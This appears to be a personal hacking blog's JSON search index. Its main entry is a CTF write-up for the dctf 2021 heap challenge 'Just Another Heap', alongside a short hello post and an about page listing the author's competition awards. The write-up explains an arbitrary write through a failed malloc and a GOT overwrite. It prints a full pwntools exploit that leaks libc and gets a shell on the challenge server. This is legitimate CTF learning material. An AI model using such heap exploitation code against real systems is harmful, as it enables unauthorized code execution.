[{"categories":["pwn","ctf"],"content":"Tasks  Pwn  Just Another Heap (500pts)     I couldnâ€™t solve this one prob in time, but I want to post this solving skills. Itâ€™s hard to find, but when I found it, Itâ€™s very simple Arbitrary Write.\n It has 5 user functions(create, relive, forget, change, listing).  create() has a role that makes malloc_frame(0x20) and malloc_userinput(size).\nThe point is, this prob has a unique fading input with this part.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  puts(\"How long is your memory\"); input_lu(\u0026size); // no size check malloc_user = malloc(size); // size \u003e 0x308 / forget -\u003e unsorted bin puts(\"Sometimes our memories fade and we only remember parts of them.\"); input_lu(\u0026fade); // no filter puts(\"Would you like to leave some space at the beginning in case you remember later?\"); if ( fade \u003c= size ) { if ( malloc_user ) { for ( i = 0; i \u003c fade; ++i ) malloc_user[i] = '_'; } malloc_user += fade;   memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0.\nSo, if malloc(size) returns 0, I can overwrite anywhere.\nExploit First, set chunks that size\u003e0x408 between 2 small chunks\nto leak libc from main_arena+xx.\nAnd make 1 tcache and 0x410 unsorted bin. Now main_arena+xx has written in unsorted bin.\nand if I rewrite and use change() to fill fade bytes and get libc addr with relive() function.\n change() function : overwrite from the beginning or behind fade _ strings relive() function : print user input with fade _ string  Finally, Use This mentioned skills to do GOT Overwriting.\n memories will be faded fade bytes with _, and user input is behind the _ strings\nif malloc_user is NOT 0.\nSo, if malloc(size) returns 0, I can overwrite anywhere.\n input /bin/sh\\x00 in malloc_frame[] and program will call strcspn(addr,'\\n'). Get The Shell.\nCode Here is the Exploit Code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  from pwn import * context.log_level='debug' def create(idx, name, size, hide, cont, important, recent): p.recv() p.sendline(str(1)) p.recv() p.sendline(str(idx)) p.recv() p.sendline(name) p.recv() p.sendline(str(size)) p.recv() p.sendline(str(hide)) p.recv() p.sendline(cont) p.recv() p.sendline(important) p.recv() p.sendline(recent) def relive(idx): p.recv() p.sendline(str(2)) p.recv() p.sendline(str(idx)) def change(idx, cont): p.recv() p.sendline(str(4)) p.recv() p.sendline(str(idx)) p.recv() p.sendline(\"Y\") p.recv() p.send(cont) def forget(idx): p.recv() p.sendline(str(3)) p.recv() p.sendline(str(idx)) def listing(): p.recv() p.sendline(str(5)) p=remote(\"dctf-chall-just-another-heap.westeurope.azurecontainer.io\", 7481) #p=process(\"./just_another_heap\") e=ELF(\"./just_another_heap\") l=e.libc create(0, \"A\"*8, 0x20, 0, \"1234\", \"N\", \"N\") create(1, \"B\"*8, 0x410, 0, \"1234\", \"N\", \"N\") create(2, \"A\"*8, 0x20, 0, \"1234\", \"N\", \"N\") forget(0) forget(1) #pause() create(3, \"B\"*8, 0x410, 6, \"\", \"N\", \"N\") #pause() change(3,\"A\"*8) relive(3) p.recvuntil(\"A\"*7+\" \") libc_base=u64(p.recv(6).ljust(8,'\\x00'))-0x3ebca0 print hex(libc_base) create(4, \"C\"*8, libc_base, e.got['strcspn'], p64(libc_base+l.sym['system']), \"N\", \"N\") pause() p.recv() p.sendline(str(1)) p.recv() p.sendline(\"//bin/sh\\x00\") p.interactive()   ","description":"","tags":[],"title":"dctf Pwn Write-up","uri":"/posts/dctf_2021_just_another_heap/"},{"categories":["etc"],"content":"My second github blog start And using hugo It was fun! And it can be set easily~ ","description":"","tags":["hello","world"],"title":"Start","uri":"/posts/start/"},{"categories":null,"content":"Ainsetin ðŸ’¯ hi, I'm from South Korea. I study Coding and Pwnable, etc.\n 2019-2021 Korea Digital Media High School 18th (3rd Grade) 2020 STEALTH Club Leader 2021.04- TeamH4C, Team ST4RT Pwner   Stats ðŸ’» At First, I study Coding and Algorithm(PS) with a little Math.\nbut I nearly quit studying this topic and do Hacking Tech Study.\nI usually practice pwnable wargame in pwnable.tw, pwnable.xyz, pwn.college.\nI also study lectures with Dreamhack hard and keep solving their wargame.\n Awards ðŸŽ–  2016-2018 Korea Olympiad of Informatics Bronze AwardðŸ¥‰ 2018 EDAILY Coding Challenge Finalist 2019-2020 Korea Olympiad of Informatics 4th Award 2020 Kookmin Univ. Algorighm Competition Finalist, 4th Award 2020 Kyunghee Univ. Algorithm Competition Finalist The Hacking Championship Junior 2020 Bronze AwardðŸ¥‰ (8th) 2020 Youth Information Security Festival ðŸ¥‡ (1st) 2021 Shakticon CTF 4th 2021 TRUST CTF Bronze AwardðŸ¥‰ (3th) 2021 Hspace CTF 5th  ","description":"","tags":null,"title":"Ainset.in","uri":"/about/"}]
